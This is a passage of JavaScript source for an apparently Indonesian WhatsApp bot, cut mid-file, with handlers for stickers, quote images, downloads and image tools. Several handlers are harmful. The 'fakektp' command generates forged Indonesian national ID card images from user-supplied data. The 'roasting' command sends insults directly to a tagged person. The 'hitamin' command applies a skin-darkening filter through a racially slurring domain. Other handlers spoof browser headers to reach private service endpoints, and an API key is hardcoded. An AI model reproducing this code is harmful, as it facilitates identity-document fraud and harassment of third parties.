${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
`.trim()
    Reply(teks)
  } catch (e) {
    console.error(e)
    Reply(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
  }
}
break
case 'createquote': {
  if (!text) return Reply('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
  const { createCanvas, loadImage } = require('canvas');
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await conn.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${pushname}*\n\n> © Kelpin`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break

case "qc": {
if (!text) return Reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "ReplyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return Reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

case "searchsticker": {
    if (!text) return Reply('Sticker Apa Yg Kamu Cari?')
    Reply('_Sedang Mencari Sticker..._');
    
    try {
        let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
            return Reply('Tidak ditemukan sticker yang sesuai');
        }

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];

        let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                      `- *Title:* ${response.data.title}\n` +
                      `- *Creator:* ${response.creator}\n` +
                      `- *Jumlah Sticker:* ${response.data.sticker_url.length}\n` +
                      `_Mengirim Sticker Harap Tunggu..._`;
        
        await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });
        let allStickers = [...response.data.sticker_url];
        allStickers.sort(() => Math.random() - 0.5);
        const maxStickers = Math.min(10, allStickers.length);
        let successCount = 0;
        let attemptCount = 0;
        
        while (successCount < maxStickers && attemptCount < allStickers.length) {
            try {
                const stickerUrl = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, stickerUrl, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`
                });
                
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
            }
            attemptCount++;
        }

        if (successCount < maxStickers) {
            Reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
        } else if (response.data.sticker_url.length > 10) {
            Reply(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
        }

    } catch (e) {
        console.error('Error in stickersearch:', e);
        Reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case 'deepimg': {
 if (!text) return Reply("Masukkan prompt gambar.")
 Reply("Sedang memproses gambar, mohon tunggu...")

 try {
const axios = require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return Reply("Gagal membuat gambar. Coba ganti promptnya.")
 await conn.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: m })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 Reply("Terjadi kesalahan saat memproses gambar.")
 }
}
break

case 'mediafire': 
case 'mf': {
    try {
        let link = args[0] || "";
        if (!/www.mediafire.com/.test(link)) return Reply("⚠️ Masukan Link MediaFire!");

        const f = await fetch(link, {
            headers: {
                'accept-encoding': 'gzip, deflate, br, zstd',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            }
        })

        if (!f.ok) return Reply('❌Terjadi kesalahan pada situs web.')

        const t = await f.text()
        const $ = cheerio.load(t)
        const url = $('.input.popsok').attr('href')

        if (!url || !/\/\/download\d+\.mediafire\.com\//.test(url)) return Reply('❌Gagal Link Mf Buat Download Gada!')

        const [name, date, size, type] = [
            $('.intro .filename').text(),
            $('.details li:nth-child(2) span').text(),
            $('.details li:nth-child(1) span').text(),
            $('.intro .filetype').text()
        ]

        const cont = {
            'af': 'Africa',
            'an': 'Antarctica',
            'as': 'Asia',
            'eu': 'Europe',
            'na': 'North America',
            'oc': 'Oceania',
            'sa': 'South America'
        }

        const $lo = $('.DLExtraInfo-uploadLocation')

        const [continent, location, flag] = [
            $lo.find('.DLExtraInfo-uploadLocationRegion').attr('data-lazyclass').replace('continent-', ''),
            $lo.find('.DLExtraInfo-sectionDetails p').text().match(/from (.*?) on/)?.[1],
            $lo.find('.flag').attr('data-lazyclass').replace('flag-', '')
        ]

        const {
            data
        } = await axios.get(url, {
            responseType: "arraybuffer"
        });
        const {
            mime
        } = await conn.getFile(data);

        let caption = ` -(☘️MediaFire Download☘️)-
 *-(Name)-:* ${name}
 *-(Size)-:* ${size}
 *-(Continent)-:* ${cont[continent] || 'Unkown'}
 *-(Mimetype)-:* ${mime}
 *-(Location)-:* ${location}
 *-(Flag)-:* ${flag}
 *-(Url_Dl)-:* ${url}`;

        await conn.sendMessage(m.chat, {
            document: data,
            mimetype: mime,
            fileName: name,
            caption,
        }, {
            quoted: m
        });
    } catch (e) {
        Reply("❌Gomene Error Mungkin lu kebanyakan request");
        console.error({
            status: false,
            msg: e.message
        })
    }
}
break

case 'pin' :
case 'pinfoto': {
const axios = require('axios')
const https = require('https')

const agent = new https.Agent({
 rejectUnauthorized: true,
 maxVersion: 'TLSv1.3',
 minVersion: 'TLSv1.2'
});

async function getCookies() {
 try {
 const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
 const setCookieHeaders = response.headers['set-cookie'];
 if (setCookieHeaders) {
 const cookies = setCookieHeaders.map(cookieString => {
 const cookieParts = cookieString.split(';');
 return cookieParts[0].trim();
 });
 return cookies.join('; ');
 }
 return null;
 } catch {
 return null;
 }
}

async function pinterest(query) {
 try {
 const cookies = await getCookies();
 if (!cookies) return [];

 const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
 const params = {
 source_url: `/search/pins/?q=${query}`,
 data: JSON.stringify({
 options: {
 isPrefetch: false,
 query: query,
 scope: "pins",
 no_fetch_context_on_resource: false
 },
 context: {}
 }),
 _: Date.now()
 };

 const headers = {
 'accept': 'application/json, text/javascript, */*, q=0.01',
 'accept-encoding': 'gzip, deflate',
 'accept-language': 'en-US,en;q=0.9',
 'cookie': cookies,
 'dnt': '1',
 'referer': 'https://www.pinterest.com/',
 'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
 'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Windows"',
 'sec-ch-ua-platform-version': '"10.0.0"',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137000.0 Safari/537.36 Edg/137000.0',
 'x-app-version': 'c056fb7',
 'x-pinterest-appstate': 'active',
 'x-pinterest-pws-handler': 'www/[username]/[slug].js',
 'x-pinterest-source-url': '/hargr003/cat-pictures/',
 'x-requested-with': 'XMLHttpRequest'
 };

 const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
 return data.resource_response.data.results
 .filter(v => v.images?.orig)
 .map(result => ({
 upload_by: result.pinner.username,
 fullname: result.pinner.full_name,
 followers: result.pinner.follower_count,
 caption: result.grid_title,
 image: result.images.orig.url,
 source: "https://id.pinterest.com/pin/" + result.id,
 }));
 } catch {
 return [];
 }
}

 if (!text) return Reply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
 
 let [query, count] = text.split(' ');
 let imgCount = 5;

 if (text.indexOf(' ') !== -1) {
 const lastWord = text.split(' ').pop();
 if (!isNaN(lastWord) && lastWord.trim() !== '') {
 imgCount = parseInt(lastWord);
 query = text.substring(0, text.lastIndexOf(' '));
 } else {
 query = text;
 }
 } else {
 query = text;
 }
 
 Reply('Searching Pinterest images...');
 
 try {
 const results = await pinterest(query);
 if (results.length === 0) return Reply(`No results found for "${query}". Try another search term.`);
 
 const imagesToSend = Math.min(results.length, imgCount);
 Reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
 
 for (let i = 0; i < imagesToSend; i++) {
 await conn.sendMessage(m.chat, { image: { url: results[i].image } });
 }
 } catch {
 Reply('Error occurred while fetching Pinterest images. Please try again later.');
 }
}
break

case 'playstore': {
if (!text) return Reply(`${prefix + command} WhatsApp`)
Reply('Proses..')
await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.nama}\n`
teks += `*◦ Developer :* ${i.developer}\n`
teks += `*◦ Rating :* ${i.rate}\n`
teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
Reply(teks)
}).catch(err => Reply('Error 🗿'))
}
break


case 'fakektp': {
    try {
        if (!text) {
            return Reply(`*Contoh penggunaan:*\n${prefix + command} provinsi|kota|nik|nama|ttl|jenis_kelamin|golongan_darah|alamat|rt/rw|kelurahan|kecamatan|agama|status|pekerjaan|kewarganegaraan|masa_berlaku|terbuat|photo_url\n\n*Format contoh:*\n${prefix + command} Jakarta|Jakarta Timur|31752331637393|Reyz|24-04-2008 Jakarta|laki-laki|AB|jalan bahagia|08/06|Tengah|Kramat jati|Islam|belum menikah|manajer|Indonesia|seumur hidup|21-12-2025|https://cdn.yupra.my.id/yp/vi1275ok.png`);
        }

        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const params = text.split('|');
        if (params.length < 18) {
            return Reply(`*🍂 Parameter kurang!*\n\nDibutuhkan *18 parameter*, tetapi hanya menerima *${params.length}*.\n*Pastikan urutan parameter sesuai contoh!*`);
        }

        const baseURL = 'https://theresapisv3.vercel.app/canvas/ektp';
        const query = new URLSearchParams({
            provinsi: params[0].trim(),
            kota: params[1].trim(),
            nik: params[2].trim(),
            nama: params[3].trim(),
            ttl: params[4].trim(),
            jenis_kelamin: params[5].trim(),
            golongan_darah: params[6].trim(),
            alamat: params[7].trim(),
            'rt/rw': params[8].trim(),
            'kel/desa': params[9].trim(),
            kecamatan: params[10].trim(),
            agama: params[11].trim(),
            status: params[12].trim(),
            pekerjaan: params[13].trim(),
            kewarganegaraan: params[14].trim(),
            masa_berlaku: params[15].trim(),
            terbuat: params[16].trim(),
            pas_photo: params[17].trim()
        });

        const url = `${baseURL}?${query.toString()}`;
        const response = await fetch(url);
        
        if (!response.ok) {
            Reply (`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
        }

        const buffer = await response.arrayBuffer();
        await conn.sendMessage(m.chat, {
            image: Buffer.from(buffer)
        }, { quoted: m });

    } catch (error) {
        Reply(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
    } finally {
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
};
break 

case 'dongeng': {
 try {
 const res = await fetch('https://apizell.web.id/random/dongeng');
 const json = await res.json();
 let caption = `*${json.title}*\n_By ${json.author}_\n\n${json.storyContent.replace(/<[^>]*>/g, '').trim()}\n\n*Nasihat:* ${json.storyContent.split('Nasihat :')[1]?.trim() || '-'}`;
 conn.sendMessage(m.chat, {
 image: { url: json.image },
 caption: caption
 }, { quoted: m });
 } catch (e) {
 Reply('Gagal mengambil dongeng. Coba lagi nanti.');
 console.error(e);
 }
}
 break

case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
 if (!text.includes(',')) return Reply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
 
 let [from, to] = text.split(',').map(v => v.trim());
 let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
 try {
 let response = await fetch(biyumaunyepong);
 let data = await response.json();
 if (data.status !== 200) return Reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
 let result = data.result;
 let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
 Reply(msg);
 } catch (e) {
 console.error(e);
 Reply('Terjadi kesalahan saat mengambil data!');
 }
 break
case "cecan": case "cn": {
 await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
 const apiEndpoints = {
 "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
 "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
 "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
 "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
 "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
 "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
 }
 try {
 const axios = require('axios');
 let araara = new Array()
 const imagesPerCountry = 2
 for (const [country, url] of Object.entries(apiEndpoints)) {
 for (let i = 0; i < imagesPerCountry; i++) {
 try {
 const response = await axios.get(url, { responseType: 'arraybuffer' })
 let imgsc = await prepareWAMessageMedia(
 { image: Buffer.from(response.data) }, 
 { upload: conn.waUploadToServer }
 )
 araara.push({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: true,
 ...imgsc
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [{ 
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
 }]
 })
 })
 await new Promise(resolve => setTimeout(resolve, 500))
 
 } catch (error) {
 console.error(`Error processing image ${i + 1} for ${country}:`, error)
 continue
 }
 }
 }
 if (araara.length === 0) {
 throw new Error('No valid images found')
 }
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: araara
 })
 })
 }
 }
 }, {userJid: m.sender, quoted: m})

 await conn.relayMessage(m.chat, msgii.message, { 
 messageId: msgii.key.id 
 })
 await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
 } catch (error) {
 console.error('Error:', error)
 await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
 return Reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
 }
}
break

case 'cogan': {
 try {
 const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
 const data = await res.json();
 if (!Array.isArray(data)) return Reply('Data tidak valid.');
 const randomImage = data[Math.floor(Math.random() * data.length)];
 conn.sendMessage(m.chat, {
 image: { url: randomImage },
 caption: 'Nih cogan buat kamu :v'
 }, { quoted: m });
 } catch (err) {
 console.error(err);
 Reply('Gagal mengambil data cogan.');
 }
 }
 break

case 'roasting':
case 'roasting': {
 let orang = m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : text
 ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : null;
 if (!orang) return Reply('Tag orang atau ketik nomornya, contoh: *.roast @user* atau *.roast 628xxxx*');
 let ppthumb;
 try {
 ppthumb = await conn.profilePictureUrl(orang, 'image');
 } catch {
 ppthumb = global.image.menu;
 }
 const roastList = [
 `@user, kadang gue mikir, kamu tuh kayak sinyal 1 bar di tengah hutan—nggak berguna tapi selalu muncul pas gak dibutuhin.`,
 `@user, lu tuh kayak charger 15 ribuan—bisa dipake, tapi bikin panas dan ngerusak semuanya.`,
 `@user, kalau otak kamu dijual di marketplace, kemungkinan besar masuk kategori "rusak parah, dijual kiloan".`,
 `@user, kamu kayak WiFi tetangga—kelihatan tapi nggak bisa dipake. Ngeselin banget!`,
 `@user, kalau ngomong tuh kayak lagu remix—banyak noise tapi gak jelas maksudnya.`,
 `@user, kamu itu bukan toxic sih, tapi lebih kayak limbah beracun yang seharusnya dikarantina 40 tahun.`,
 `@user, gaya hidupmu tuh kayak skripsi anak semester 9—jalan di tempat, banyak alasan, hasil nol.`,
 `@user, lu tuh kayak CAPTCHA yang gak bisa ditebak, cuma nyusahin orang doang.`,
 `@user, kalau jadi karakter game, kamu tuh pasti NPC yang ngasih misi gagal dari awal.`,
 `@user, jujur aja... tiap kamu buka mulut, IQ ruangan turun 10 poin.`,
 `@user, muka kamu tuh kayak error 404—nggak ketemu solusinya, bikin stres.`,
 `@user, kalau jadi hewan, kamu pasti masuk kategori hewan mitos, soalnya gak ada yang ngerti eksistensimu.`,
 `@user, kamu tuh kayak alarm jam 5 pagi pas libur—gak penting, cuma ganggu tidur orang.`,
 `@user, IQ kamu tuh kayak ping server merah—tinggi banget tapi gak berguna.`,
 `@user, lu tuh kayak file corrupt—dibuka bikin kesel, dihapus sayang kuota.`,
 `@user, kalau ada lomba jadi beban, lu pasti juara bertahan 5 tahun berturut-turut.`,
 `@user, jokes kamu tuh kayak sinetron azab—maksa, basi, tapi tetep aja nongol.`,
 `@user, ngomong sama lu tuh kayak ngisi CAPTCHA terus gagal, muter-muter gak jelas.`,
 `@user, kalau ketawa lu direkam, bisa dipake buat usir tuyul.`,
 `@user, gaya kamu tuh kayak intro YouTuber 2012—lebay, norak, dan pengen skip.`,
 `@user, lu tuh kayak charger rusak—bisa nyambung tapi nyetrum perasaan orang.`,
 `@user, setiap kamu muncul, vibes-nya kayak error di Windows—tiba-tiba, bikin panik, dan nyusahin.`,
 `@user, kamu itu kayak sandi WiFi yang udah nggak aktif—masih diingat, tapi udah gak guna.`,
 `@user, kamu tuh kayak grup WA keluarga—rame, tapi gak ada faedahnya.`,
 `@user, kalau jadi app, kamu pasti butuh update tiap hari tapi tetep nge-lag.`,
 `@user, tampangmu kayak file zip, kecil tapi isinya berat semua.`,
 `@user, vibes kamu kayak baterai 1%—mau dimanfaatin aja orang males.`,
 `@user, kalau lu jadi sinetron, pasti judulnya *“Anak Durhaka Gagal Update Otak.”*`,
 `@user, lu tuh kayak file download-an gagal—udah nunggu lama, eh error juga.`,
 `@user, otak lu kayak server gratis—down terus tiap dibutuhin.`,
 `@user, kalo jadi emoji, lu tuh pasti "buffering".`,
 `@user, IQ lu kayak koneksi WiFi publik—semua bisa pake, tapi nggak bisa diandalkan.`,
 `@user, tiap kali lu ngomong, grammar dunia ikut menangis.`,
 `@user, kalo jadi film, lu dapet rating 1 bintang dari netizen dan makhluk halus.`,
 `@user, jokes kamu tuh kayak status Facebook 2010—garing, jadul, dan bikin malu.`
 ];
 const roastText = roastList[Math.floor(Math.random() * roastList.length)].replace(/@user/g, `@${orang.split('@')[0]}`);
 try {
 await conn.sendMessage(orang, {
 text: roastText,
 mentions: [orang],
 contextInfo: {
 externalAdReply: {
 title: `${botname} - ${versi} ⚙️`,
 body: `⏱ Runtime: ${runtime(process.uptime())}`,
 thumbnailUrl: ppthumb,
 sourceUrl: global.linkSaluran
 }
 }
 });
 } catch (error) {
 console.error("Error saat mengirim pesan:", error);
 Reply('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
 }
}
break

case "hitamin": {
 if (!/image/.test(mime)) return Reply("Reply gambar yang mau dihitamin dengan caption *hitamin*");
 const mediaPath = await conn.downloadAndSaveMediaMessage(qmsg);
 const buffer = fs.readFileSync(mediaPath);
 const base64Image = buffer.toString("base64");
 try {
const axios = require('axios');
 const response = await axios({
 url: "https://negro.consulting/api/process-image",
 method: "POST",
 data: {
 filter: "hitam",
 imageData: "data:image/png;base64," + base64Image
 }
 });

 const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
 await conn.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

 fs.unlinkSync(mediaPath);
 } catch (err) {
 console.log(err);
 Reply("Gagal memproses gambar.");
 }
}
break
case "getwm":
case "take":
case "colong": {
if (!m.quoted) return Reply("reply sticker nya+namamu")

let mime = (m.quoted.msg || m.quoted).mimetype || ""
if (!/webp/.test(mime)) return Reply("itu bukan sticker")

let media = await m.quoted.download()

let pack = text.split("|")[0] ? text.split("|")[0] : global.packname
let author = text.split("|")[1] ? text.split("|")[1] : global.author

await conn.sendAsSticker(m.chat, media, m, {
packname: pack,
author: author
})
}
break
case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return Reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return Reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

case "emojimix": {
if (!text) return Reply(example('😀|😍'))
if (!text.split("|")) return Reply(example('😀|??'))
let [e1, e2] = text.split("|")
let brat = `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "emojigif": {
if (!text) return Reply(example('😍'))
try {
const axios = require('axios');
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case 'remini':
case 'hd': {
    const availableScaleRatio = [2, 4];

    const imgupscale = {
        req: async (imagePath, scaleRatio) => {
            const FormData = require('form-data');
            const fs = require('fs');
            const axios = require('axios');
            const form = new FormData();
            form.append('myfile', fs.createReadStream(imagePath));
            form.append('scaleRadio', scaleRatio.toString());

            const response = await axios.request({
                method: 'POST',
                url: 'https://get1.imglarger.com/api/UpscalerNew/UploadNew',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
                    'Accept': 'application/json, text/plain, */*',
                    'origin': 'https://imgupscaler.com',
                    'referer': 'https://imgupscaler.com/',
                    ...form.getHeaders()
                },
                data: form
            });
            return response.data;
        },

        cek: async (code, scaleRatio) => {
            const axios = require('axios');
            const response = await axios.request({
                method: 'POST',
                url: 'https://get1.imglarger.com/api/UpscalerNew/CheckStatusNew',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'origin': 'https://imgupscaler.com',
                    'referer': 'https://imgupscaler.com/'
                },
                data: JSON.stringify({ code, scaleRadio: scaleRatio })
            });
            return response.data;
        },

        upscale: async (imagePath, scaleRatio, maxRetries = 30, retryDelay = 2000) => {
            const uploadResult = await imgupscale.req(imagePath, scaleRatio);
            if (uploadResult.code !== 200) {
                throw new Error(`Upload failed: ${uploadResult.msg}`);
            }

            const { code } = uploadResult.data;
            for (let i = 0; i < maxRetries; i++) {
                const statusResult = await imgupscale.cek(code, scaleRatio);

                if (statusResult.code === 200 && statusResult.data.status === 'success') {
                    return {
                        success: true,
                        downloadUrls: statusResult.data.downloadUrls
                    };
                }

                if (statusResult.data.status === 'error') {
                    throw new Error('Processing failed on server');
                }
                await new Promise(resolve => setTimeout(resolve, retryDelay));
            }
            throw new Error('Processing timeout - maximum retries exceeded');
        }
    };

    if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
        return Reply('Reply gambar dengan perintah .hd 2x atau .hd 4x');
    }

    const scale = args[0]?.replace(/x/i, '') || '2';
    if (!availableScaleRatio.includes(Number(scale))) {
        return Reply('Pilih resolusi: 2x atau 4x');
    }

    let tmpPath;
    try {
        await Reply('⏳ Sedang memproses gambar, mohon tunggu...');
        
const buffer = await conn.downloadMediaMessage(m.quoted);
        const tmpDir = './tmp';
        const fs = require('fs');
        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }
        
        const { default: path } = await import('path');
        tmpPath = path.join(tmpDir, `sanhua_hd_${Date.now()}.jpg`);
        fs.writeFileSync(tmpPath, buffer);

        const result = await imgupscale.upscale(tmpPath, Number(scale));
        
        if (!result.success || !result.downloadUrls?.length) {
            throw new Error('Gagal melakukan upscale gambar.');
        }

        await conn.sendMessage(m.chat, { 
            image: { url: result.downloadUrls[0] }, 
            caption: `✅ Gambar berhasil ditingkatkan menjadi ${scale}x`
        }, { quoted: m });

    } catch (e) {
        Reply(`Terjadi error: ${e.message}`);
    } finally {
        const fs = require('fs');
        if (tmpPath && fs.existsSync(tmpPath)) {
            fs.unlinkSync(tmpPath);
        }
    }
}
break

case 'hdvideo': {
    conn.videohd = conn.videohd || {};
    if (m.sender in conn.videohd) return Reply("Sabar, lagi proses ya, jangan dispam.");

    if (!text) return Reply(`Contoh: ${prefix + command} 1080 60fps`);

    const resolutions = {
        "480": "480", "720": "720", "1080": "1080",
        "2k": "1440", "4k": "2160", "8k": "4320"
    };

    let [res, fpsText] = text?.trim().toLowerCase().split(" ");
    let fps = 60;
    if (fpsText && fpsText.endsWith("fps")) {
        fps = parseInt(fpsText.replace("fps", ""));
        if (isNaN(fps) || fps < 30 || fps > 240) {
